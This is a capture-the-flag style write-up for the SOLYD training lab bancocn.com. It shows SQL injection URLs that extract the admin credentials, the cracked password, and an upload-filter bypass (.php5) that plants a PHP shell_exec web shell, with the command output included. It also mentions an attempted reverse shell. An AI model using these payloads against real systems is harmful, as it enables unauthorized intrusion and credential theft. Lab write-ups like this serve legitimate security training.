# Write-up for the SOLYD Lab: bancocn.com 
## SQLi to extract admin credentials + RCE via file upload and payload obfuscation 

### Scope 
Target: Web server located at bancocn.com (port 80) 
Type: Black box 

### Reconnaissance 
The website is protected by Cloudflare. 
Nmap shows barely anything open—just 4 common HTTP/HTTPS web ports: 80, 443, 8080, and 8443. 
WHOIS details are obscured due to WHOIS privacy protection. Expiration date: 2027-03-29. 
Using Google Dorks, I found http://www.bancocn.com/assets/ and http://www.bancocn.com/classes/ exposed.<!-- Looks like it's out of scope, but I sent 'em a message anyway --> 

<!-- Shall we access the website?! -->
Using a small list from dirb, I found the following directories and files: 
403 .htaccess  
403 .htpasswd  
200 admin/ - Secret login panel  
200 assets/ - Directory listing  
200 images/ - Directory listing  
200 robots.txt - Also exposes admin/  
200 index.php - Let's explore its functionality  
<!-- Pages assets/, images/, and classes/ look to be filtered client-side content, but I'll take a look at them soon -->

**Found URL parameter ?id=1 while navigating through the site:** 
http://www.bancocn.com/cat.php?id=1 
<!-- This attack vector looks like a good point for us to proceed with -->

### Exploitation 
Testing for SQLi in the exposed id parameter in the URL to check if it is properly sanitized. 
Added a single quote to the end { http://www.bancocn.com/cat.php?id=1' } to see if it exposes any misconfiguration. 
It returned the following error message: 
"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1" 
Which exposes the database service running: MariaDB. 

{ http://www.bancocn.com/cat.php?id=1%20order%20by%204-- } shows that column #4 does not exist, but { http://www.bancocn.com/cat.php?id=1%20order%20by%203-- } works, which means there are 3 columns in the table where the content is stored. 
{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,3-- } reveals that column number 3 is rendered on screen. I'm going to try to retrieve data through it. 

{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(version(),0x3a,0x3a,database())-- } returns: 
**10.1.44-MariaDB-0ubuntu0.18.04.1::bancocn** 

{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()-- } 
**categories,pictures,stats,users** 

{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27-- } 
**id,login,password** 

{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(login,0x3a,0x3a,password)%20from%20users-- } 
**admin::7b71be0e85318117d2e514ce2a2e222c** 

This appears to be the login for the /admin page found earlier. 
We can try this hash on [hashes.com](https://hashes.com/en/tools/hash_identifier) to identify what it is. 
Looks like it's MD5. 
Cracking the hash via md5decrypt.net translates it to senhafoda. 

Logging into the /admin panel with admin : senhafoda works. Now I'm looking at an image upload feature and will try to upload a PHP payload, since I found earlier that the index page is in PHP. 

The standard `.php` extension is prohibited by the upload filter. To bypass this, I intercepted the request in Burp Suite and tested alternative PHP extensions. The application allowed `.php5` uploads without enforcing strict `Content-Type` checks for images. 
 
Payload used: `<?php echo shell_exec($_GET["cmd"]); ?>` saved as `payday.php5`. 

After uploading `payday.php5`, the file retained its original filename and was stored under `/admin/uploads/`. Accessing the web shell and passing the `cmd` parameter allows arbitrary command execution: 

`http://www.bancocn.com/admin/uploads/payday.php5?cmd=whoami` 

Output returned on screen: 
**www-data** 

At this point, we have web shell access under the context of the `www-data` service account, enabling command execution across the server (e.g., system enumeration, extracting application configs, or staging further local exploits). 

This machine is powered by Solyd OffSec and is actually broken. I even tunneled an ngrok session to a local netcat listener to catch a reverse shell, but it couldn't be established due to the target environment constraints. A few years ago, I was able to get a reverse shell, retrieve server credentials for other machines on this network, pivot, and perform PrivEsc through a CVE in the installed sudo version. 
<!-- It was hours of my time until I got frustrated and finally decided to rewatch their course, only to realize my answer was correct. Many other students were having the same problem as me, and they didn't even care to answer...-->
Me and other students have already sent tickets to their support staff, but at the moment, this web shell access is the maximum access we can get.
